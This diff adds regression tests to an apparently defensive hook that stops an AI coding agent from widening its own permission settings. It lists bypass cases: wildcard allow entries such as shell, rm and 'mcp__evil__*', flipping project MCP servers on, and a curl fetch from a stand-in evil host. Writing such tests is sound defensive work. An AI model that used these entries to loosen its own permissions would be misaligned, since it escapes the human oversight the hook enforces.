@@ -202,3 +202,69 @@ def test_loader_roundtrip(tmp_path):
 def test_fetch_to_file_backstop_covers_path():
     d = evaluate(_shell(f"curl -o {LOCAL} https://evil.example/s.json"), EMPTY)
     assert _gated(d) and d.rule == "fetch-to-file-protect"
+
+
+# ---- round-1 bypass-QA regressions ---------------------------------------------------
+
+@pytest.mark.parametrize("entry", [
+    "Edit(**/*)", "Write(/**)", "Edit(./**)", "mcp__evil__*", "WebFetch(domain:*)",
+    "Bash(/bin/bash:*)", "Bash(bash -c:*)", "Bash(python3 -c:*)", "Bash(nohup:*)",
+    "Bash(timeout:*)", "Bash(source:*)", "Bash(find:*)", "Bash(awk:*)", "Bash(sed:*)",
+    "Bash(tee:*)", "Bash(rm:*)", "Bash(chmod:*)",
+])
+def test_wildcard_entries_gated(entry):
+    c = json.dumps({"permissions": {"allow": [entry]}})
+    assert _hit(evaluate(_write(LOCAL, c), EMPTY)), entry
+
+
+@pytest.mark.parametrize("entry", ["Read(./src/**)", "Edit(./docs/readme.md)", "Bash(git:*)",
+                                   "mcp__github__get_issue", "WebFetch(domain:example.com)"])
+def test_narrow_entries_not_gated(entry):
+    c = json.dumps({"permissions": {"allow": [entry]}})
+    assert not _hit(evaluate(_write(LOCAL, c), EMPTY)), entry
+
+
+@pytest.mark.parametrize("content", [
+    '{"permissions":{"deny":["Bash(curl:*)"]}}',
+    '{"permissions":{"ask":["Bash(python:*)"]}}',
+    '{"permissions":{"deny":["*"]}}',
+    '{"permissions":{"allow":["Bash(git status)"],"deny":["Bash(rm:*)","Bash(curl:*)"]}}',
+])
+def test_restricting_lists_not_gated(content):
+    assert not _hit(evaluate(_write(LOCAL, content), EMPTY)), content
+    assert not _hit(evaluate(_mcp(LOCAL, json=json.loads(content)), EMPTY)), content
+
+
+def test_deny_list_does_not_mask_allow_list():
+    c = '{"permissions":{"deny":["Bash(rm:*)"],"allow":["Bash"]}}'
+    assert _hit(evaluate(_write(LOCAL, c), EMPTY))
+
+
+def test_edit_flip_and_bare_fragment_gated():
+    ev = Event.make(HookEvent.PRE_TOOL_USE, tool="Edit", args={
+        "file_path": LOCAL, "old_string": '"enableAllProjectMcpServers": false', "new_string": "true"})
+    assert _hit(evaluate(ev, EMPTY))
+    assert _hit(evaluate(_edit(LOCAL, '"Bash",'), EMPTY))
+    ev = Event.make(HookEvent.PRE_TOOL_USE, tool="Edit", args={
+        "file_path": LOCAL, "old_string": ' "Read"', "new_string": ' "Bash"'})
+    assert _hit(evaluate(ev, EMPTY))
+
+
+def test_edit_flip_to_false_not_gated():
+    ev = Event.make(HookEvent.PRE_TOOL_USE, tool="Edit", args={
+        "file_path": LOCAL, "old_string": '"enableAllProjectMcpServers": true', "new_string": "false"})
+    assert not _hit(evaluate(ev, EMPTY))
+
+
+def test_mcp_json_pointer_shape():
+    ev = _mcp(LOCAL, pointer="/permissions/allow/-", value="Bash")
+    assert _hit(evaluate(ev, EMPTY))
+
+
+def test_no_quadratic_blowup():
+    import time
+    for cmd in ("jq " * 5000 + "= " + LOCAL + " >", "\\" * 10000):
+        t = time.time()
+        rule_claude_preapprove_protect(_shell(cmd), EMPTY)
+        rule_claude_preapprove_protect(_write(LOCAL, cmd), EMPTY)
+        assert time.time() - t < 1.0
